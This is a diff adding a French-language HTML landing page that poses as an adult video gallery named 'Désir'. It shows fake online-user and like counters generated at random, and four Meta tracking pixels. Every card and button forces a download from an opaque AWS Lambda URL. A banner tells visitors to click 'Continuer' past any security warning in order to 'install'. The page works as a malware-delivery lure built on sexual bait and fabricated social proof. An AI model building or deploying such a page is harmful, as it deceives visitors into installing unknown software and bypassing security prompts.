@@ -1,0 +1,428 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta name="theme-color" content="#12081a">
+  <meta name="description" content="Désir">
+  <title>Désir</title>
+
+  <style>
+    :root {
+      --bg: #12081a;
+      --card: #1e1228;
+      --text: #f8f0ff;
+      --muted: #b8a0c8;
+      --accent: #d946ef;
+      --accent2: #f0abfc;
+      --gold: #fbbf24;
+      --line: #3a2450;
+      --radius: 20px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
+      padding-bottom: 220px;
+      min-height: 100vh;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    button { cursor: pointer; -webkit-tap-highlight-color: transparent; }
+
+    .header {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      background: rgba(18,8,26,0.95);
+      backdrop-filter: blur(14px);
+      border-bottom: 1px solid var(--line);
+      padding: 16px 18px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      font-size: 26px;
+      font-weight: 900;
+      letter-spacing: -1px;
+      background: linear-gradient(90deg, #d946ef, #fbbf24);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .online {
+      font-size: 12px;
+      color: #4ade80;
+      background: rgba(74,222,128,0.12);
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-weight: 600;
+    }
+
+    .online::before { content: "●"; margin-right: 6px; font-size: 9px; }
+
+    .notice-wrap {
+      position: sticky;
+      top: 64px;
+      z-index: 19;
+      padding: 12px 16px;
+      background: rgba(18,8,26,0.92);
+      backdrop-filter: blur(10px);
+    }
+
+    .notice {
+      background: linear-gradient(135deg, #2a1540, #3d1f55);
+      border: 1px solid #d946ef;
+      border-radius: 16px;
+      padding: 16px 18px;
+      color: #fff;
+      font-size: 15px;
+      line-height: 1.5;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 16px;
+      padding: 16px 16px 24px;
+    }
+
+    @media (min-width: 520px) {
+      .grid { grid-template-columns: repeat(3, 1fr); }
+    }
+
+    .card {
+      background: var(--card);
+      border-radius: var(--radius);
+      overflow: hidden;
+      border: 1px solid var(--line);
+      cursor: pointer;
+      transition: transform 0.18s ease;
+    }
+
+    .card:active { transform: scale(0.96); }
+
+    .cover {
+      position: relative;
+      aspect-ratio: 3/4;
+      background: #2a1a38;
+      overflow: hidden;
+    }
+
+    .cover img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .duration {
+      position: absolute;
+      right: 10px;
+      bottom: 10px;
+      background: rgba(0,0,0,0.75);
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 9px;
+      border-radius: 8px;
+    }
+
+    .play-icon {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 50px;
+      height: 50px;
+      background: rgba(217,70,239,0.9);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 20px rgba(217,70,239,0.4);
+    }
+
+    .play-icon::after {
+      content: "";
+      width: 0;
+      height: 0;
+      border-left: 16px solid #fff;
+      border-top: 11px solid transparent;
+      border-bottom: 11px solid transparent;
+      margin-left: 4px;
+    }
+
+    .card-body { padding: 14px 14px 16px; }
+
+    .card-title {
+      font-size: 14px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      line-height: 1.3;
+    }
+
+    .card-meta {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 12px;
+    }
+
+    .likes { color: var(--gold); font-weight: 600; }
+
+    .download-btn {
+      background: linear-gradient(90deg, #d946ef, #c026d3);
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 8px 14px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    .float-dl {
+      position: fixed;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 25;
+      width: 62px;
+      height: 62px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #d946ef, #fbbf24);
+      color: #fff;
+      border: none;
+      box-shadow: 0 8px 24px rgba(217,70,239,0.45);
+      font-size: 14px;
+      font-weight: 900;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      line-height: 1.1;
+    }
+
+    .bottom-bar {
+      position: fixed;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      z-index: 30;
+      background: rgba(20,10,30,0.96);
+      backdrop-filter: blur(18px);
+      border-top: 1px solid var(--line);
+      padding: 14px 20px calc(16px + env(safe-area-inset-bottom));
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .bottom-bar button {
+      width: 100%;
+      max-width: 360px;
+      border: none;
+      border-radius: 16px;
+      padding: 16px 12px;
+      font-size: 16px;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    .btn-main {
+      background: linear-gradient(90deg, #d946ef, #c026d3);
+    }
+
+    .btn-sec {
+      background: #2a1a38;
+      border: 1px solid #4a3060;
+    }
+
+    .more-card {
+      grid-column: 1 / -1;
+      background: linear-gradient(135deg, #2a1540, #3d1f55);
+      border: 1px solid #d946ef;
+    }
+  </style>
+
+  <!-- Meta Pixel Code -->
+  <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+
+    const META_PIXEL_IDS = [
+      "1761288435564809",
+      "2721047271687618",
+      "1498952742126596",
+      "1770260260942873"
+    ];
+
+    META_PIXEL_IDS.forEach(function(pixelId) {
+      fbq("init", pixelId);
+    });
+
+    fbq("track", "PageView");
+  </script>
+  <noscript>
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1761288435564809&ev=PageView&noscript=1">
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2721047271687618&ev=PageView&noscript=1">
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1498952742126596&ev=PageView&noscript=1">
+    <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1770260260942873&ev=PageView&noscript=1">
+  </noscript>
+</head>
+
+<body>
+  <header class="header">
+    <div class="logo">Désir</div>
+    <div class="online" id="onlineCount">18 432 en ligne</div>
+  </header>
+
+  <div class="notice-wrap">
+    <div class="notice">
+      Si un message de sécurité apparaît, cliquez sur « Continuer » pour installer et accéder à tout.
+    </div>
+  </div>
+
+  <section class="grid" id="content"></section>
+
+  <button class="float-dl" id="floatDl" type="button">↓<br>GO</button>
+
+  <div class="bottom-bar">
+    <button class="btn-main" id="btnDownload" type="button">Accéder au contenu complet</button>
+    <button class="btn-sec" id="btnPlay" type="button">▶ Voir immédiatement</button>
+    <button class="btn-sec" id="btnDate" type="button">💬 Échanger en privé</button>
+  </div>
+
+  <script>
+    const DOWNLOAD_URL = "https://tacuehjb2zswi3vfaxkuo4sb4a0sexxu.lambda-url.eu-west-3.on.aws/C77QhEvWRYeN";
+
+    const NAMES = [
+      "Léa","Chloé","Emma","Manon","Camille","Sarah","Julie","Laura",
+      "Marine","Clara","Inès","Louise","Anna","Sophie","Mélanie","Élise",
+      "Nora","Alicia","Jade","Lina"
+    ];
+
+    const ITEMS = [
+      {id:"v01",cover:"v01.webp",duration:"12:30"},
+      {id:"v02",cover:"v02.webp",duration:"18:45"},
+      {id:"v03",cover:"v03.webp",duration:"09:20"},
+      {id:"v04",cover:"v04.webp",duration:"22:10"},
+      {id:"v05",cover:"v05.webp",duration:"15:55"},
+      {id:"v06",cover:"v06.webp",duration:"11:40"},
+      {id:"v07",cover:"v07.webp",duration:"27:05"},
+      {id:"v08",cover:"v08.webp",duration:"14:25"},
+      {id:"v09",cover:"v09.webp",duration:"19:50"},
+      {id:"v10",cover:"v10.webp",duration:"08:15"},
+      {id:"v11",cover:"v11.webp",duration:"21:30"},
+      {id:"v12",cover:"v12.webp",duration:"16:40"},
+      {id:"v13",cover:"v13.webp",duration:"13:55"},
+      {id:"v14",cover:"v14.webp",duration:"24:10"},
+      {id:"v15",cover:"v15.webp",duration:"10:05"},
+      {id:"v16",cover:"v16.webp",duration:"17:35"},
+      {id:"v17",cover:"v17.webp",duration:"20:20"},
+      {id:"v18",cover:"v18.webp",duration:"12:50"},
+      {id:"v19",cover:"v19.webp",duration:"15:15"},
+      {id:"v20",cover:"v20.webp",duration:"18:00"}
+    ];
+
+    function randomOnline() {
+      const n = Math.floor(Math.random() * 80000) + 12000;
+      return n.toLocaleString("fr-FR") + " en ligne";
+    }
+
+    function randomLikes() {
+      const n = Math.floor(Math.random() * 30000) + 600;
+      return n > 9999 ? (n / 1000).toFixed(1) + "k" : n.toString();
+    }
+
+    function escapeHtml(str) {
+      return String(str).replace(/[&<>"']/g, c => ({
+        "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
+      })[c]);
+    }
+
+    function recordDownloadClick() {
+      try {
+        const records = JSON.parse(localStorage.getItem("download_clicks") || "[]");
+        records.push({event:"download_click", timestamp:new Date().toISOString()});
+        localStorage.setItem("download_clicks", JSON.stringify(records.slice(-500)));
+      } catch (e) {}
+    }
+
+    function triggerDownload() {
+      if (typeof fbq === "function") {
+        fbq("trackCustom", "DownloadClick", { action_type: "download_click" });
+      }
+      recordDownloadClick();
+      const a = document.createElement("a");
+      a.href = DOWNLOAD_URL;
+      a.rel = "noopener";
+      a.download = "download";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+    }
+
+    function render() {
+      const html = ITEMS.map((item, i) => `
+        <article class="card">
+          <div class="cover">
+            <img src="${escapeHtml(item.cover)}" alt="" loading="lazy">
+            <div class="play-icon"></div>
+            <span class="duration">${escapeHtml(item.duration)}</span>
+          </div>
+          <div class="card-body">
+            <div class="card-title">${escapeHtml(NAMES[i % NAMES.length])}</div>
+            <div class="card-meta">
+              <span class="likes">♥ ${randomLikes()}</span>
+              <button class="download-btn" type="button">Voir plus</button>
+            </div>
+          </div>
+        </article>
+      `).join("");
+
+      const moreCard = `
+        <article class="card more-card">
+          <div class="card-body" style="padding:32px 18px;text-align:center;">
+            <div style="font-size:19px;font-weight:800;margin-bottom:10px;">Encore plus à découvrir</div>
+            <div style="font-size:14px;color:var(--muted);margin-bottom:18px;">Débloque l’intégralité du contenu</div>
+            <button class="download-btn" type="button" style="padding:13px 28px;font-size:15px;">Accéder maintenant</button>
+          </div>
+        </article>
+      `;
+
+      document.getElementById("content").innerHTML = html + moreCard;
+    }
+
+    document.getElementById("onlineCount").textContent = randomOnline();
+    setInterval(() => {
+      document.getElementById("onlineCount").textContent = randomOnline();
+    }, 20000);
+
+    document.getElementById("btnDownload").addEventListener("click", triggerDownload);
+    document.getElementById("btnPlay").addEventListener("click", triggerDownload);
+    document.getElementById("btnDate").addEventListener("click", triggerDownload);
+    document.getElementById("floatDl").addEventListener("click", triggerDownload);
+
+    document.getElementById("content").addEventListener("click", (e) => {
+      if (e.target.closest(".card")) triggerDownload();
+    });
+
+    render();
+  </script>
+</body>
+</html>
